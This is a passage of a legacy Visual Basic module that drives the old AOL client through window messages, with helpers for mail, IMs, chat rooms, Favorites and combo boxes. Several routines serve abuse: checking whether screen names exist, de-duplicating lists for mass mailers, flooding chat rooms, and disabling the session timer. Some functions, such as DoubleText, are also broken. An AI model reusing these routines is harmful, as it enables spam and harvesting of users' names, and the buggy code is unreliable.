ErrorTxtWin& = FindWindowEx(ErrorWin&, 0&, "_AOL_View", vbNullString)
ErrorString$ = GetText(ErrorTxtWin&)
Loop Until ErrorWin& <> 0 And ErrorTxtWin& <> 0 And ErrorString$ <> ""
If InStr(LCase(ReplaceString(ErrorString$, " ", "")), LCase(ReplaceString(SN$, " ", ""))) > 0 Then
CheckAlive = False
Else
CheckAlive = True
End If
MailWin& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
Call PostMessage(ErrorWin&, WM_CLOSE, 0&, 0&)
DoEvents
Call PostMessage(MailWin&, WM_CLOSE, 0&, 0&)
DoEvents
Do
DoEvents
NoWin& = FindWindow("#32770", "America Online")
NoButton& = FindWindowEx(NoWin&, 0&, "Button", "&No")
Loop Until NoWin& <> 0& And NoButton& <> 0
Call SendMessage(NoButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(NoButton&, WM_KEYUP, VK_SPACE, 0&)
End Function
Public Function CheckIfMaster() As Boolean
'Checks to see if SN is a master SN
'Dim IsMaster As Boolean
'IsMaster = CheckIfMaster
'MsgBox IsMaster
    
    Dim aolframe As Long, AolMDI As Long, aolchild As Long
    Dim ParentalControlWindow As Long, aolicon1 As Long, NextOfClass As Long
    Dim SecondParentalControlWindow As Long, aolmodal As Long, AOLIcon2 As Long
    aolframe& = FindWindow("AOL Frame25", vbNullString)
    AolMDI& = FindWindowEx(aolframe&, 0&, "MDIClient", vbNullString)
    Call PopUpIcon(5, "C")
    Do: DoEvents
        ParentalControlWindow& = FindWindowEx(AolMDI&, 0&, "AOL Child", " Parental Controls")
        aolicon1& = FindWindowEx(ParentalControlWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until ParentalControlWindow& <> 0& And aolicon1& <> 0&
    Yield 3
    Call PostMessage(aolicon1&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(aolicon1&, WM_LBUTTONUP, 0&, 0&)
    Do: DoEvents
        SecondParentalControlWindow& = FindWindow("_AOL_Modal", "Parental Controls")
        aolmodal& = FindWindow("_AOL_Modal", vbNullString)
    Loop Until SecondParentalControlWindow& <> 0& Or aolmodal& <> 0&
    If SecondParentalControlWindow& <> 0& Then
        Call PostMessage(SecondParentalControlWindow&, WM_CLOSE, 0&, 0&)
        Call PostMessage(ParentalControlWindow&, WM_CLOSE, 0&, 0&)
        CheckIfMaster = True
        Exit Function
       ElseIf aolmodal& <> 0& Then
        AOLIcon2& = FindWindowEx(aolmodal&, 0&, "_AOL_Icon", vbNullString)
        Call KillModal
        Call PostMessage(ParentalControlWindow&, WM_CLOSE, 0&, 0&)
       CheckIfMaster = False
        Exit Function
    End If
End Function
Public Function CheckIMs(SN As String) As Boolean
'This Checks To See If SomeOne Is Able To Recive IMs Or If There On (lets the user see the msg box saying wheter or not then closes it a second after
'Example:
'Dim CanTalk As Boolean
'CanTalk = CheckIMs("del")
'MsgBox CanTalk

        Dim aol As Long, MDI As Long, IM As Long, Rich As Long
        Dim AVAIL As Long, AVAIL1 As Long, AVAIL2 As Long
        Dim AVAIL3 As Long, win As Long, Button As Long
        Dim LINT As Long, jNco As String

aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
Call Keyword("aol://9293:" & SN$)
Do
DoEvents
IM& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
Rich& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
AVAIL1& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
AVAIL2& = FindWindowEx(IM&, AVAIL1&, "_AOL_Icon", vbNullString)
AVAIL3& = FindWindowEx(IM&, AVAIL2&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL3&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL&, "_AOL_Icon", vbNullString)
AVAIL& = FindWindowEx(IM&, AVAIL&, "_AOL_Icon", vbNullString)
Loop Until IM& <> 0& And Rich <> 0& And AVAIL& <> 0& And AVAIL& <> AVAIL1& And AVAIL& <> AVAIL2& And AVAIL& <> AVAIL3&
DoEvents
Call SendMessage(AVAIL&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AVAIL&, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
win = FindWindow("#32770", "America Online")
Button& = FindWindowEx(win&, 0&, "Button", "OK")
Loop Until win& <> 0& And Button& <> 0&
Do
DoEvents
LINT& = FindWindowEx(win&, 0&, "Static", vbNullString)
LINT& = FindWindowEx(win&, LINT&, "Static", vbNullString)
jNco$ = GetText(LINT)
Loop Until LINT& <> 0& And Len(jNco$) > 15
If InStr(jNco$, "is online and able to receive") <> 0 Then
CheckIMs = True
Else
CheckIMs = False
End If
Pause (1)
Call SendMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(IM&, WM_CLOSE, 0&, 0&)
End Function

Public Sub CloseOpenMails()
'Close Open Mails
'Example:
'Call CloseOpenMails
If FindSendWindow& = 0& And FindFwdWindow& = 0& And FindReWindow& = 0& And FindOpenMail& = 0& And FindForwardWindow& = 0& Then Exit Sub
Do: DoEvents
Call PostMessage(FindSendWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindFwdWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindForwardWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindReWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(FindOpenMail&, WM_CLOSE, 0&, 0&)
Loop Until FindForwardWindow& = 0& And FindSendWindow& = 0& And FindFwdWindow& = 0& And FindReWindow& = 0& And FindOpenMail& = 0&
End Sub

Public Sub CloseWindow(win As Long)
'Closes The Window Thats Definied
'Example:
'CloseWindow(AoFrame&)
Call PostMessage(win&, WM_CLOSE, 0&, 0&)
End Sub
Public Function CheckBoxGetValue(CheckBox As Long) As Boolean
'Detirmines whether the checkbox's value is true or false
        Dim checkval As Long
checkval& = SendMessageLong(CheckBox&, BM_GETCHECK, 0&, 0&)
If checkval& = 0& Then
CheckBoxGetValue = False
ElseIf checkval& <> 0& Then
CheckBoxGetValue = True
End If
End Function
Public Sub ComboCopy(SourceCombo As Long, DestinationCombo As Long)
'Copies a combobox and puts it into another
        Dim SourceCount As Long, OfCountForIndex As Long, FixedString As String
SourceCount& = SendMessageLong(SourceCombo&, CB_GETCOUNT, 0&, 0&)
Call SendMessageLong(DestinationCombo&, CB_RESETCONTENT, 0&, 0&)
If SourceCount& = 0& Then Exit Sub
For OfCountForIndex& = 0 To SourceCount& - 1
FixedString$ = String(250, 0)
Call SendMessageByString(SourceCombo&, CB_GETLBTEXT, OfCountForIndex&, FixedString$)
Call SendMessageByString(DestinationCombo&, CB_ADDSTRING, 0&, FixedString$)
Next OfCountForIndex&
End Sub
Public Function ComboCount(ComboBox As Long) As Long
'I really never got this to work really good for me but does what it says
'Example:
'Dim duh As Long
'Combo1 = duh&
'Call ComboCount(duh&)
ComboCount& = SendMessageLong(ComboBox&, CB_GETCOUNT, 0&, 0&)
End Function
Public Function ComboGetText(ComboBox As Long, Index As Long) As String
        Dim ComboText As String * 256
Call SendMessageByString(ComboBox&, CB_GETLBTEXT, Index&, ComboText$)
ComboGetText$ = ComboText$
End Function
Public Sub ComboKillDuplicates(ComboBox As ComboBox)
'Kills the duplicates in a combo box usefull for MMers
'Example:
'Call ComboKillDuplicates(Combo1)
        Dim FirstCount As Long, SecondCount As Long
On Error Resume Next
For FirstCount& = 0& To ComboBox.ListCount - 1
For SecondCount& = 0& To ComboBox.ListCount - 1
If LCase(ComboBox.List(FirstCount&)) Like LCase(ComboBox.List(SecondCount&)) And FirstCount& <> SecondCount& Then
ComboBox.RemoveItem SecondCount&
End If
Next SecondCount&
Next FirstCount&
End Sub
Public Sub ComboRemoveNull(ComboBox As ComboBox)
        Dim Count As Long
Do: DoEvents
If TrimSpaces(ComboBox.List(Count&)) = "" Then ComboBox.RemoveItem (Count&)
Count& = Count& + 1
Loop Until Count& >= ComboCount(ComboBox.hWnd)
End Sub
Public Sub ComboScroll(ComboBox As ComboBox, Optional Delay As Single = "0.6")
'Scrolls a combo box
'Example:
'Call ComboScroll(Combo1)
        Dim ComboIndex As Long
For ComboIndex& = 0 To ComboBox.ListCount - 1
Call RoomSend(ComboBox.List(ComboIndex&))
Pause Val(Delay)
Next ComboIndex&
End Sub
Public Function ComboSearch(ComboBox As ComboBox, SearchString As String) As Boolean
'Searches a combobox for a certain string
'Example:
'Call ComboSearch(Combo1, "Hi")
        Dim Search As Long
On Error Resume Next
For Search& = 0 To ComboCount(ComboBox.hWnd) - 1
If ComboBox.List(Search&) = SearchString$ Then
ComboSearch = True
Exit Function
End If
Next Search&
End Function
Public Sub ComboSetFocus(ComboBox As Long, ListIndex As Long)
'Sets Foucus on the box of your choice
'Dim bLAh as Crap
'bLAh = Whatever
'ComboSetFocus(Combo1, bLAh&)
Call SendMessageLong(ComboBox&, CB_SETCURSEL, ListIndex&, 0&)
End Sub
Public Function ComboToTextString(ComboBox As listbox, InsertSeparator As String) As String
'Converts comboBox to a txt string
        Dim CurrentCount As Long, PrepString As String
For CurrentCount& = 0 To ComboBox.ListCount - 1
PrepString$ = PrepString$ & ComboBox.List(CurrentCount&) & InsertSeparator$
Next CurrentCount&
ComboToTextString$ = Left(PrepString$, Len(PrepString$) - 2)
End Function
Public Sub CompactPFC(Optional CheckGuest As Boolean = False)
'Compacts the Personal Fileing Cabnint
'Example:
'Call CompactPCF
        Dim UserPFC As Long, CompactIcon As Long, CompactModal As Long
        Dim ModalIcon As Long, MessageOk As Long, OKButton As Long
If CheckGuest = True Then
If Guest = True Then Exit Sub
Else
End If
Call PopUpIcon(4, "P")
Do: DoEvents
UserPFC& = FindChildByTitleEx(AolMDI&, usersn & "'s Filing Cabinet")
CompactIcon& = NextOfClassByCount(UserPFC&, "_AOL_Icon", 7)
Loop Until UserPFC& <> 0& And CompactIcon& <> 0&
Call icon(CompactIcon&)
Do: DoEvents
CompactModal& = FindWindow("_AOL_Modal", "Performance Warning")
ModalIcon& = FindChildByClass(CompactModal&, "_AOL_Icon")
Loop Until CompactModal& <> 0& And ModalIcon& <> 0&
Call icon(ModalIcon&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
End If
End Sub
Public Sub CopyText(Text As TextBox)
'Copys the selected text
Text.SelStart = 0
Text.SelLength = Len(Text)
Clipboard.SetText Text.SelText
End Sub
Public Sub CutText(Text As TextBox)
'Cuts the selected text
Text.SelStart = 0
Text.SelLength = Len(Text)
Clipboard.SetText Text.SelText
Text.SelText = ""
End Sub
Public Sub PasteText(Text As TextBox)
'Pastes the text you have copied or cut
Text.SelText = Clipboard.GetText()
End Sub
Public Sub ScrambleText(Text As TextBox)
'Scrambles text, good for scrambling bots
    Dim String1 As String, String2 As String, String3 As String
String1$ = Text
String2$ = Left(String1$, 2)
String3$ = Right(String1$, 2)
Text = (String3$ & String2$)
End Sub
Public Sub SelectAlldaText(Text As TextBox)
'Select all the text in a text field
Text.SelStart = 0
Text.SelLength = Len(Text.Text)
End Sub
Public Function DoubleText(wgf As String) As String
'This doubles each letter of the string
'Example:
'Dim wgf As String
'wgf$ = DoubleText("wgf")
        Dim ihatevar As String, chard As String
        Dim DimIt As Long, MyString As String
If wgf$ <> "" Then
For DimIt& = 1 To Len(MyString$)
chard$ = LineChar(MyString$, DimIt&)
ihatevar$ = ihatevar$ & chard$ & chard$
Next DimIt&
DoubleText$ = ihatevar$
End If
End Function


Public Sub DisableX(WinHandle As Long)
'Disables the X
        Dim SystemMenu As Long
SystemMenu& = GetSystemMenu(WinHandle&, 0)
Call RemoveMenu(SystemMenu&, 6, MF_BYPOSITION)
End Sub
Public Sub DisableTimer()
'Disables the timer that counts how long youve been on
        Dim AoTimeKeeper As Long
AoTimeKeeper& = FindWindow("_AOL_TimeKeeper", vbNullString)
Call WinDisable(AoTimeKeeper&)
End Sub
Public Function DownloadStatus(Optional EmphasisOnStats As Boolean = True) As String
'Checks to see if user is curentlly downloading
'Example:
'Dim Dling As Boolean
'Dling = DownloadStaus
'MsgBox DownloadStaus
If FindDownloadWindow& = 0& Then
DownloadStatus$ = "Not currently downloading"
Exit Function
End If
            Dim AoStatic1 As Long, AoStatic2 As Long
AoStatic1& = FindWindowEx(FindDownloadWindow&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(FindDownloadWindow&, AoStatic1&, "_AOL_Static", vbNullString)
If EmphasisOnStats = True Then DownloadStatus$ = "File transfer for: <b>" & GetInstance(GetText(AoStatic1&), " ", 3) & "</b>" & vbCrLf & "Percentage done: <b>" & ExtractNumeric(GetCaption(FindDownloadWindow&)) & "%</b>" & vbCrLf & "Time remaining: <b>" & GetText(AoStatic2&)
If EmphasisOnStats = False Then DownloadStatus$ = "File transfer for: " & GetInstance(GetText(AoStatic1&), " ", 3) & vbCrLf & "Percentage done: " & ExtractNumeric(GetCaption(FindDownloadWindow&)) & "%" & vbCrLf & "Time remaining: " & GetText(AoStatic2&)
End Function
Public Function ErrorName(Daname As Long) As String
        Dim aol As Long, MDI As Long, ErrorWin As Long
        Dim ErrorTxtWin As Long, ErrorStrin As String
        Dim DaNameCount As Long, TempStng As String
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDICLIENT", vbNullString)
ErrorWin& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
If ErrorWin& = 0& Then Exit Function
ErrorTxtWin& = FindWindowEx(ErrorWin&, 0&, "_AOL_View", vbNullString)
ErrorStrin$ = GetText(ErrorTxtWin&)
DaNameCount& = LineCount(ErrorStrin$) - 2
If DaNameCount& < Daname& Then Exit Function
TempStng$ = LineFromString(ErrorStrin$, Daname& + 2)
TempStng$ = Left(TempStng$, InStr(TempStng$, "-") - 2)
ErrorName$ = TempStng$
End Function
Public Function ErrorNameCount() As Long
        Dim aol As Long, MDI As Long, ErrorWin As Long
        Dim ErrorTxtWin As Long, ErrorStin As String
        Dim DaNameCount As Long
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDICLIENT", vbNullString)
ErrorWin& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
If ErrorWin& = 0& Then Exit Function
ErrorTxtWin& = FindWindowEx(ErrorWin&, 0&, "_AOL_View", vbNullString)
ErrorStin$ = GetText(ErrorTxtWin&)
DaNameCount& = LineCount(ErrorStin$) - 2
ErrorNameCount& = DaNameCount&
End Function
Public Function ExtractAlpha(thestring As String) As String
'Extracts letters from a string
'Example:
'Wgfisthe1st
'Would become:
'Wgfisthest
        Dim Instance As Long, FoundAlpha As String, NewString As String
For Instance& = 1 To Len(thestring$)
FoundAlpha$ = Mid(thestring$, Instance&, 1)
If IsNumeric(FoundAlpha$) = False Then
NewString$ = NewString$ & FoundAlpha$
End If
Next Instance&
ExtractAlpha$ = NewString$
End Function
Public Function ExtractNumeric(thestring As String) As String
'Extracts nummebrs from a string
'Example:
'Wgfisthe1st
'Would become:
'1
        Dim Instance As Long, FoundNumeric As String, NewString As String
For Instance& = 1 To Len(thestring$)
FoundNumeric$ = Mid(thestring$, Instance&, 1)
If IsNumeric(FoundNumeric$) = True Then
NewString$ = NewString$ & FoundNumeric$
End If
Next Instance&
ExtractNumeric$ = NewString$
End Function
Public Sub FormImplode(f As Form, Direction As Integer, Movement As Integer, ModalState As Integer)
'This Also works =)
'Example:
'Call FormImplode(Me, 2, 500, 7)

        Dim myRect As RECT
        Dim formWidth%, formHeight%, i%, X%, y%, cx%, cy%
        Dim TheScreen As Long
        Dim Brush As Long
    
GetWindowRect f.hWnd, myRect
formWidth = (myRect.Right - myRect.Left)
formHeight = myRect.Bottom - myRect.Top
TheScreen = GetDC(0)
Brush = CreateSolidBrush(f.BackColor)
    
For i = Movement To 1 Step -1
cx = formWidth * (i / Movement)
cy = formHeight * (i / Movement)
X = myRect.Left + (formWidth - cx) / 2
y = myRect.Top + (formHeight - cy) / 2
Rectangle TheScreen, X, y, X + cx, y + cy
Next i
    
X = ReleaseDC(0, TheScreen)
DeleteObject (Brush)
        
End Sub

Sub FormExplode(f As Form, Movement As Integer)
'Mine works unlike some peoples
'Example:
'Call FormExplode(me,3333)
        Dim myRect As RECT
        Dim formWidth%, formHeight%, i%, X%, y%, cx%, cy%
        Dim TheScreen As Long
        Dim Brush As Long
    
GetWindowRect f.hWnd, myRect
formWidth = (myRect.Right - myRect.Left)
formHeight = myRect.Bottom - myRect.Top
TheScreen = GetDC(0)
Brush = CreateSolidBrush(f.BackColor)
    
For i = 1 To Movement
cx = formWidth * (i / Movement)
cy = formHeight * (i / Movement)
X = myRect.Left + (formWidth - cx) / 2
y = myRect.Top + (formHeight - cy) / 2
Rectangle TheScreen, X, y, X + cx, y + cy
Next i
    
X = ReleaseDC(0, TheScreen)
DeleteObject (Brush)
End Sub
Public Sub EnableTimer()
'Enables the timer that counts how long youve been on
        Dim AoTimeKeeper As Long
AoTimeKeeper& = FindWindow("_AOL_TimeKeeper", vbNullString)
Call WinEnable(AoTimeKeeper&)
End Sub
Sub Enter(win As String)
Call SendCharNum(win$, 13)
End Sub
Public Sub EnableX(WinHandle As Long)
'Enables the X
        Dim SystemMenu As Long
SystemMenu& = GetSystemMenu(WinHandle&, 1)
Call RemoveMenu(SystemMenu&, 6, MF_BYPOSITION)
End Sub


Public Sub FavoritesAddNewFolder(Name As String, Optional CheckGuest As Boolean = False, Optional CloseFpAfterAdd As Boolean = True)
'Adds a Fav place folder, cool eh?
        Dim FavoritePlaces As Long, FPIcon As Long, AddNf_Fp As Long
        Dim MessageOk As Long, OKButton As Long
        Dim NewFolderCheckBox As Long, NameEdit As Long
If TrimSpaces(Name$) = "" Then Exit Sub
If CheckGuest = True Then
If Guest = True Then
Exit Sub
Else
End If
End If
FavoritePlaces& = FindChildByTitleEx(AolMDI&, "Favorite Places")
If FavoritePlaces& = 0& Then Call PopUpIcon(6, "F")
Do: DoEvents
FavoritePlaces& = FindChildByTitleEx(AolMDI&, "Favorite Places")
FPIcon& = NextOfClassByCount(FavoritePlaces&, "_AOL_Icon", 2)
Loop Until FavoritePlaces& <> 0& And FPIcon& <> 0&
Call ClickIcon(FPIcon&)
Do: DoEvents
AddNf_Fp& = FindChildByTitleEx(AolMDI&, "Add New Folder/Favorite Place")
NewFolderCheckBox& = NextOfClassByCount(AddNf_Fp&, "_AOL_Checkbox", 2)
NameEdit& = FindChildByClass(AddNf_Fp&, "_AOL_Edit")
Loop Until AddNf_Fp& <> 0& And NewFolderCheckBox& <> 0& And NameEdit& <> 0&
Call ClickIcon(NewFolderCheckBox&)
DoEvents
Call SetText(NameEdit&, Name$)
Call SendMessageLong(NameEdit&, WM_CHAR, ENTER_KEY, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindWindowEx(AolMDI&, 0&, "AOL Child", "Add New Folder/Favorite Place") = 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call WinClose(AddNf_Fp&)
If CloseFpAfterAdd = True Then Call WinClose(FavoritePlaces&)
Exit Sub
Else
If CloseFpAfterAdd = True Then Call WinClose(FavoritePlaces&)
End If
End Sub
Public Sub FavoritesAddPlace(URL As String, Description As String, Optional CheckGuest As Boolean = False, Optional CloseFpAfterAdd As Boolean = True)
'Adds a Favortie Place, cool eh?
        Dim FavoritePlaces As Long, FPIcon As Long, AddNf_Fp As Long
        Dim DesEdit As Long, UrlEdit As Long, MessageOk As Long, OKButton As Long
If TrimSpaces(URL$) = "" Or TrimSpaces(Description$) = "" Then Exit Sub
If CheckGuest = True Then
If Guest = True Then
Exit Sub
Else
End If
End If
FavoritePlaces& = FindChildByTitleEx(AolMDI&, "Favorite Places")
If FavoritePlaces& = 0& Then Call PopUpIcon(6, "F")
Do: DoEvents
FavoritePlaces& = FindChildByTitleEx(AolMDI&, "Favorite Places")
FPIcon& = NextOfClassByCount(FavoritePlaces&, "_AOL_Icon", 2)
Loop Until FavoritePlaces& <> 0& And FPIcon& <> 0&
Call ClickIcon(FPIcon&)
Do: DoEvents
AddNf_Fp& = FindChildByTitleEx(AolMDI&, "Add New Folder/Favorite Place")
DesEdit& = NextOfClassByCount(AddNf_Fp&, "_AOL_Edit", 2)
UrlEdit& = NextOfClassByCount(AddNf_Fp&, "_AOL_Edit", 3)
Loop Until AddNf_Fp& <> 0& And DesEdit& <> 0& And UrlEdit& <> 0&
Call SetText(DesEdit&, Description$)
Call SetText(UrlEdit&, URL$)
Call SendMessageLong(UrlEdit&, WM_CHAR, ENTER_KEY, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindWindowEx(AolMDI&, 0&, "AOL Child", "Add New Folder/Favorite Place") = 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call WinClose(AddNf_Fp&)
If CloseFpAfterAdd = True Then Call WinClose(FavoritePlaces&)
Exit Sub
Else
If CloseFpAfterAdd = True Then Call WinClose(FavoritePlaces&)
End If
End Sub
Public Function FileExists(TheFileName As String) As Boolean
'Sees if the string(file) you specified exists
If Len(TheFileName$) = 0 Then
FileExists = False
Exit Function
End If
If Len(Dir$(TheFileName$)) Then
FileExists = True
Else
FileExists = False
End If
End Function
Public Sub FloppyThink(TimesToDo As Long)
        Dim Number As Long
Do
Number& = Number& + 1
Call RoomSend("{s *a:\spinning}")
Loop Until Number& = TimesToDo&
End Sub
Public Function FindChildByTitleEx(ParentWindow As Long, WindowTxt As String) As Long
FindChildByTitleEx& = FindWindowEx(ParentWindow&, 0&, vbNullString, WindowTxt$)
End Function
Public Function FileGetAttributes(DaFileName As String) As Integer
'Gets attributes of a file
        Dim TheSafeFile As String
TheSafeFile$ = Dir(DaFileName$)
If TheSafeFile$ <> "" Then
FileGetAttributes% = GetAttr(DaFileName$)
End If
End Function
Public Sub FileSetNormal(DaFileName As String)
'Sets fiel attributes to normal
        Dim DaSafeFile As String
DaSafeFile$ = Dir(DaFileName$)
If DaSafeFile$ <> "" Then
SetAttr DaFileName$, vbNormal
End If
End Sub
Public Sub FileSetReadOnly(TheFileName As String)
'Makes the file read only
        Dim TheSafeFile As String
TheSafeFile$ = Dir(TheFileName$)
If TheSafeFile$ <> "" Then
SetAttr TheFileName$, vbReadOnly
End If
End Sub
Public Function FindBuddyList() As Long
'Finds the buddy list
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If GetCaption(AoChild&) = usersn & "'s Buddy List" Or GetCaption(AoChild&) = usersn & "'s Buddy Lists" Then
FindBuddyList& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If GetCaption(AoChild&) = usersn & "'s Buddy List" Or GetCaption(AoChild&) = usersn & "'s Buddy Lists" Then
FindBuddyList& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindBuddyList& = AoChild&
End Function
Public Function FindBuddyView() As Long
'Finds buddy view
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
If GetCaption(AoChild&) = "Buddy List Window" Then
FindBuddyView& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
If GetCaption(AoChild&) = "Buddy List Window" Then
FindBuddyView& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindBuddyView& = AoChild&
End Function
Public Function FindDownloadWindow() As Long
'Finds dl window
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoStatic As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoStatic& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
If InStr(GetCaption(AoChild&), "File Transfer") <> 0& And InStr(GetText(AoStatic&), "Downloading") <> 0& Then
FindDownloadWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AolMDI&, AoChild&, "AOL Child", vbNullString)
AoStatic& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
If InStr(GetCaption(AoChild&), "File Transfer") <> 0& And InStr(GetText(AoStatic&), "Downloading") <> 0& Then
FindDownloadWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindDownloadWindow& = AoChild&
End Function
Public Function FindErrorWindow() As Long
'Finds Errorwin
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Error")
If AoChild& <> 0& Then
FindErrorWindow& = AoChild&
Exit Function
Else
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", "Error")
FindErrorWindow& = AoChild&
Exit Function
End If
End Function


Public Function FindIM() As Long
'Finds IM win
        Dim aol As Long, MDI As Long, Child1 As Long, Caption1 As String
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
Child1& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
Caption1$ = GetCaption(Child1&)
If InStr(Caption1$, "Instant Message") = 1 Or InStr(Caption1$, "Instant Message") = 2 Or InStr(Caption1$, "Instant Message") = 3 Then
FindIM& = Child1&
Exit Function
Else
Do
Child1& = FindWindowEx(MDI&, Child1&, "AOL Child", vbNullString)
Caption1$ = GetCaption(Child1&)
If InStr(Caption1$, "Instant Message") = 1 Or InStr(Caption1$, "Instant Message") = 2 Or InStr(Caption1$, "Instant Message") = 3 Then
FindIM& = Child1&
Exit Function
End If
Loop Until Child1& = 0&
End If
FindIM& = Child1&
End Function
Public Function FindInfoWindow() As Long
'Finds Info win
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoCheck1 As Long, AoIcon1 As Long, AoStatic1 As Long
        Dim AoIcon2 As Long, AoGlyph1 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoChild& = FindWindowEx(AoMDI&, 0&, "AOL Child", vbNullString)
AoCheck1& = FindWindowEx(AoChild&, 0&, "_AOL_Checkbox", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoGlyph1& = FindWindowEx(AoChild&, 0&, "_AOL_Glyph", vbNullString)
AoIcon1& = FindWindowEx(AoChild&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(AoChild&, AoIcon1&, "_AOL_Icon", vbNullString)
If AoCheck1& <> 0& And AoStatic1& <> 0& And AoGlyph1& <> 0& And AoIcon1& <> 0& And AoIcon2& <> 0& Then
FindInfoWindow& = AoChild&
Exit Function
Else
Do
AoChild& = FindWindowEx(AoMDI&, AoChild&, "AOL Child", vbNullString)
AoCheck1& = FindWindowEx(AoChild&, 0&, "_AOL_Checkbox", vbNullString)
AoStatic1& = FindWindowEx(AoChild&, 0&, "_AOL_Static", vbNullString)
AoGlyph1& = FindWindowEx(AoChild&, 0&, "_AOL_Glyph", vbNullString)
AoIcon1& = FindWindowEx(AoChild&, 0&, "_AOL_Icon", vbNullString)
AoIcon2& = FindWindowEx(AoChild&, AoIcon1&, "_AOL_Icon", vbNullString)
If AoCheck1& <> 0& And AoStatic1& <> 0& And AoGlyph1& <> 0& And AoIcon1& <> 0& And AoIcon2& <> 0& Then
FindInfoWindow& = AoChild&
Exit Function
End If
Loop Until AoChild& = 0&
End If
FindInfoWindow& = AoChild&
End Function
Public Function FindChildByClass(ParentWindow As Long, ClassWindow As String) As Long
FindChildByClass& = FindWindowEx(ParentWindow&, 0&, ClassWindow$, vbNullString)
End Function
Public Function FindAboutWindow() As Long
'Same As FindInfoWindow
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoCheck1 As Long, AoIcon1 As Long, AoStatic1 As Long
        Dim AoIcon2 As Long, AoGlyph1 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
